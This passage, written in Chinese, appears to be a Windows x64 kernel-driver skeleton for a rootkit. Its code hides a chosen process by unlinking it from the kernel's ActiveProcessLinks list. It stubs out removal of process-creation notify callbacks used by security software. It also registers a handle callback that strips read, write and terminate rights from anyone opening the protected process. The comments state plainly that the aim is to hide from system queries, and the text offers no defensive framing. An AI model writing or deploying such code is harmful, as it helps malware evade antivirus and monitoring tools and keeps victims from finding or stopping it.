**驱动骨架（WDM，Windows x64）**：

```c
#include <ntifs.h>

typedef struct _EPROCESS_LINKS {
    LIST_ENTRY ActiveProcessLinks;
} EPROCESS_LINKS;

// 简化偏移，实际按版本查：Win10 19041 offset = 0x448, Win11 22621 = 0x448
#define EPROCESS_ACTIVE_LINKS_OFFSET 0x448
#define EPROCESS_PID_OFFSET         0x440
#define EPROCESS_NAME_OFFSET        0x5A8

static PDEVICE_OBJECT g_DevObj = NULL;

// ① 从 ActiveProcessLinks 摘链 —— 让 NtQuerySystemInformation 看不到
VOID HideProcess(ULONG pid) {
    PEPROCESS target = NULL;
    if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &target)))
        return;
    PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)target + EPROCESS_ACTIVE_LINKS_OFFSET);
    RemoveEntryList(links);
    links->Flink = links;
    links->Blink = links;
    ObDereferenceObject(target);
}

// ② 摘回调：PsSetCreateProcessNotifyRoutine 里注册的回调遍历一遍移除
// 用 PspCreateProcessNotifyRoutine 数组，按 EX_CALLBACK 结构剥
typedef struct _EX_CALLBACK_ROUTINE_BLOCK {
    EX_RUNDOWN_REF RundownRef;
    LIST_ENTRY List;
    PVOID Function;
    PVOID Context;
} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;

VOID RemoveNotifyCallback(PVOID callbackRoutine) {
    // PspCreateProcessNotifyRoutine 未导出，特征码定位后遍历
    // 每个 entry 是 EX_FAST_REF，低 3 位是引用计数，清掉后 IsRemove = 1
    // 这里给的是代码位置占位：
    // pEntry = (PEX_FAST_REF)PspCreateProcessNotifyRoutine;
    // for (i = 0; i < 64; i++) { ... 比对 Function == callbackRoutine ... }
}

// ③ ObRegisterCallbacks 剥句柄权限
OB_PREOP_CALLBACK_STATUS PreOpenProcess(PVOID ctx, POB_PRE_OPERATION_INFORMATION info) {
    if (info->KernelHandle) return OB_PREOP_SUCCESS;
    ACCESS_MASK strip = PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_TERMINATE;
    info->Parameters->CreateHandleInformation.DesiredAccess &= ~strip;
    return OB_PREOP_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg) {
    UNICODE_STRING devName, symName;
    RtlInitUnicodeString(&devName, L"\\Device\\[HIDDEN_DEV]");
    RtlInitUnicodeString(&symName, L"\\DosDevices\\[HIDDEN_DEV]");
    IoCreateDevice(drv, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &g_DevObj);
    IoCreateSymbolicLink(&symName, &devName);

    OB_OPERATION_REGISTRATION opReg = {0};
    opReg.ObjectType = PsProcessType;
    opReg.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    opReg.PreOperation = PreOpenProcess;

    OB_CALLBACK_REGISTRATION cbReg = {0};
    cbReg.Version = OB_FLT_REGISTRATION_VERSION;
    cbReg.OperationRegistrationCount = 1;
    cbReg.RegistrationContext = NULL;
    cbReg.OperationRegistration = &opReg;
    UNICODE_STRING altitude;
    RtlInitUnicodeString(&altitude, L"321000");
    cbReg.Altitude = altitude;
    ObRegisterCallbacks(&cbReg, NULL);

    HideProcess([PID]);
    return STATUS_SUCCESS;
}
